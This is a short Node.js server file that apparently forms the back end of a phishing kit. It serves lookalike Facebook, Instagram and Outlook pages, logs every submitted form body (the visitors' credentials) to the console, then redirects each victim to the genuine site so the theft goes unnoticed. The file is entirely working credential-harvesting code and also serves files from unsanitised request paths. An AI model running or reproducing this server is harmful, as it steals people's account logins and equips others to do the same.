const http = require('http');
const fs = require('fs').promises;
const path = require('path');
const PORT = 8080;
const BASE_PATH = path.join(__dirname, 'public')

const server = http.createServer(async (req, res) => {
    let url = req.url;
    if(req.url == "" || req.url == "/") {
        url = "facebook.html";
    }

     switch(req.method) {
    case "GET":
        GET(url, req, res);
        break;
    case "POST":
        POST(url, req, res)
        break;
 }
})


 async function GET(url, req, res) {
      if (url === '/facebook') {
        url = 'facebook.html';
    } else if (url === '/instagram') {
        url = '/instagram.html';
    } else if (url === '/outlook') {
        url = '/outlook.html';
    }


    const filePath = path.join(BASE_PATH, url)

    try {
        const file = await fs.readFile(filePath);
        res.write(file);
    } catch (err) {
        const errorFile = await fs.readFile(path.join(BASE_PATH, '404.html'));
        res.write(errorFile);
    }
    finally {
        res.end();
    }
 }

 async function POST (url , req, res) {
    var body = '';
    req.on('data', chunk => {
        body += chunk;
    });
    req.on('end', async () => {
        let urlresult = url.replace('/', '').replace('.html', '');
        console.log(body);

        res.statusCode = 302;

        res.setHeader('Location', `https://www.${urlresult}.com`); 

        res.end();

    })
 }

server.listen(PORT);